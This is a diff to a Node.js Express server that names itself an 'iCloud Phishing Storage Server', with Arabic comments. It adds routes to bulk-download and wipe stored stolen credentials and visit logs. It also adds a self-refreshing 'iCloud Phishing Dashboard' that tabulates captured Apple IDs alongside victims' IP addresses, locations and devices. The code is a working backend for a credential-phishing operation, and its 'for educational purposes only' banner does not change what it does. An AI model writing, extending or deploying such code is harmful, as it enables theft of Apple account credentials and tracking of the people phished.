@@ -270,3 +270,270 @@ app.get('/api/download/:type', (req, res) => {
                     
                     files.forEach(file => {
                         const content = JSON.parse(
+                            fs.readFileSync(path.join(credentialsDir, file), 'utf8')
+                        );
+                        allCreds.push(content);
+                    });
+                }
+                
+                fs.writeFileSync(filepath, JSON.stringify(allCreds, null, 2));
+                break;
+                
+            case 'visits':
+                filename = `visits_${timestamp}.json`;
+                filepath = path.join(storageDir, filename);
+                
+                // تجميع جميع الزيارات
+                const allVisits = [];
+                if (fs.existsSync(visitsDir)) {
+                    const files = fs.readdirSync(visitsDir)
+                        .filter(file => file.endsWith('.json'));
+                    
+                    files.forEach(file => {
+                        const content = JSON.parse(
+                            fs.readFileSync(path.join(visitsDir, file), 'utf8')
+                        );
+                        allVisits.push(content);
+                    });
+                }
+                
+                fs.writeFileSync(filepath, JSON.stringify(allVisits, null, 2));
+                break;
+                
+            default:
+                return res.status(400).json({ success: false, error: 'Invalid type' });
+        }
+        
+        res.download(filepath, filename, (err) => {
+            if (err) {
+                console.error('Error downloading file:', err);
+            }
+            // حذف الملف المؤقت بعد التحميل
+            setTimeout(() => {
+                if (fs.existsSync(filepath)) {
+                    fs.unlinkSync(filepath);
+                }
+            }, 5000);
+        });
+        
+    } catch (error) {
+        console.error('Error preparing download:', error);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// 🗑️ حذف البيانات
+app.delete('/api/clear/:type', (req, res) => {
+    try {
+        const type = req.params.type;
+        
+        switch (type) {
+            case 'credentials':
+                if (fs.existsSync(credentialsDir)) {
+                    fs.rmSync(credentialsDir, { recursive: true, force: true });
+                    fs.mkdirSync(credentialsDir, { recursive: true });
+                }
+                break;
+                
+            case 'visits':
+                if (fs.existsSync(visitsDir)) {
+                    fs.rmSync(visitsDir, { recursive: true, force: true });
+                    fs.mkdirSync(visitsDir, { recursive: true });
+                }
+                break;
+                
+            case 'all':
+                if (fs.existsSync(storageDir)) {
+                    fs.rmSync(storageDir, { recursive: true, force: true });
+                    [credentialsDir, visitsDir, logsDir].forEach(dir => {
+                        fs.mkdirSync(dir, { recursive: true });
+                    });
+                }
+                break;
+                
+            default:
+                return res.status(400).json({ success: false, error: 'Invalid type' });
+        }
+        
+        res.json({ success: true, message: `Cleared ${type} data` });
+        
+    } catch (error) {
+        console.error('Error clearing data:', error);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// 🎯 واجهة المستخدم البسيطة
+app.get('/dashboard', (req, res) => {
+    const html = `
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>iCloud Phishing Dashboard</title>
+        <style>
+            body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f7; }
+            .container { max-width: 1200px; margin: 0 auto; }
+            .header { background: #007AFF; color: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
+            .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin-bottom: 30px; }
+            .stat-card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+            .stat-value { font-size: 32px; font-weight: bold; color: #007AFF; }
+            .stat-label { color: #666; margin-top: 5px; }
+            .table-container { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+            table { width: 100%; border-collapse: collapse; }
+            th, td { padding: 12px; text-align: left; border-bottom: 1px solid #eee; }
+            th { background: #f9f9f9; font-weight: bold; }
+            .actions { display: flex; gap: 10px; margin-top: 20px; }
+            .btn { padding: 10px 20px; background: #007AFF; color: white; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; display: inline-block; }
+            .btn:hover { background: #0056CC; }
+            .btn-danger { background: #FF3B30; }
+            .btn-danger:hover { background: #D70015; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="header">
+                <h1>📊 iCloud Phishing Dashboard</h1>
+                <p>Real-time monitoring and data collection</p>
+            </div>
+            
+            <div class="stats-grid" id="statsGrid">
+                <!-- سيتم ملؤها بالجافاسكريبت -->
+            </div>
+            
+            <div class="table-container">
+                <h2>📧 Latest Credentials</h2>
+                <div id="credentialsTable">
+                    <!-- سيتم ملؤها بالجافاسكريبت -->
+                </div>
+            </div>
+            
+            <div class="actions">
+                <a href="/api/download/credentials" class="btn">📥 Download Credentials</a>
+                <a href="/api/download/visits" class="btn">📥 Download Visits</a>
+                <button onclick="clearData('all')" class="btn btn-danger">🗑️ Clear All Data</button>
+            </div>
+        </div>
+        
+        <script>
+            async function loadStats() {
+                try {
+                    const response = await fetch('/api/stats');
+                    const data = await response.json();
+                    
+                    if (data.success) {
+                        const stats = data.stats;
+                        document.getElementById('statsGrid').innerHTML = \`
+                            <div class="stat-card">
+                                <div class="stat-value">\${stats.totalCredentials}</div>
+                                <div class="stat-label">Total Credentials</div>
+                            </div>
+                            <div class="stat-card">
+                                <div class="stat-value">\${stats.totalVisits}</div>
+                                <div class="stat-label">Total Visits</div>
+                            </div>
+                            <div class="stat-card">
+                                <div class="stat-value">\${stats.last24Hours.credentials}</div>
+                                <div class="stat-label">Credentials (24h)</div>
+                            </div>
+                            <div class="stat-card">
+                                <div class="stat-value">\${stats.last24Hours.visits}</div>
+                                <div class="stat-label">Visits (24h)</div>
+                            </div>
+                        \`;
+                    }
+                } catch (error) {
+                    console.error('Error loading stats:', error);
+                }
+            }
+            
+            async function loadCredentials() {
+                try {
+                    const response = await fetch('/api/data/credentials');
+                    const data = await response.json();
+                    
+                    if (data.success && data.credentials.length > 0) {
+                        let tableHTML = '<table><tr><th>Time</th><th>Apple ID</th><th>IP</th><th>Location</th><th>Device</th></tr>';
+                        
+                        data.credentials.forEach(cred => {
+                            tableHTML += \`<tr>
+                                <td>\${new Date(cred.timestamp).toLocaleString()}</td>
+                                <td>\${cred.data.appleId || 'N/A'}</td>
+                                <td>\${cred.data.ip || 'N/A'}</td>
+                                <td>\${cred.data.location?.city || 'Unknown'}, \${cred.data.location?.country || 'Unknown'}</td>
+                                <td>\${cred.data.device?.userAgent?.substring(0, 50) || 'Unknown'}</td>
+                            </tr>\`;
+                        });
+                        
+                        tableHTML += '</table>';
+                        document.getElementById('credentialsTable').innerHTML = tableHTML;
+                    } else {
+                        document.getElementById('credentialsTable').innerHTML = '<p>No credentials captured yet.</p>';
+                    }
+                } catch (error) {
+                    console.error('Error loading credentials:', error);
+                }
+            }
+            
+            async function clearData(type) {
+                if (!confirm('Are you sure you want to clear all data? This cannot be undone.')) {
+                    return;
+                }
+                
+                try {
+                    const response = await fetch(\`/api/clear/\${type}\`, { method: 'DELETE' });
+                    const data = await response.json();
+                    
+                    if (data.success) {
+                        alert('Data cleared successfully!');
+                        loadStats();
+                        loadCredentials();
+                    }
+                } catch (error) {
+                    console.error('Error clearing data:', error);
+                    alert('Error clearing data');
+                }
+            }
+            
+            // تحميل البيانات عند بدء التشغيل
+            loadStats();
+            loadCredentials();
+            
+            // تحديث كل 30 ثانية
+            setInterval(() => {
+                loadStats();
+                loadCredentials();
+            }, 30000);
+        </script>
+    </body>
+    </html>
+    `;
+    
+    res.send(html);
+});
+
+// 🏃 تشغيل الخادم
+app.listen(PORT, () => {
+    console.log(`
+    🚀 iCloud Phishing Storage Server
+    📡 Running on: http://localhost:${PORT}
+    
+    📊 Endpoints:
+    POST /api/collect/credentials  - Save captured credentials
+    POST /api/collect/visits       - Save visit data
+    GET  /api/stats               - Get statistics
+    GET  /api/data/credentials    - Get recent credentials
+    GET  /dashboard              - Web dashboard
+    GET  /api/download/:type     - Download data
+    DELETE /api/clear/:type      - Clear data
+    
+    📁 Storage directories created:
+    ${storageDir}
+    ├── credentials/
+    ├── visits/
+    └── logs/
+    
+    ⚠️  FOR EDUCATIONAL PURPOSES ONLY
+    `);
+});
+
+module.exports = app;
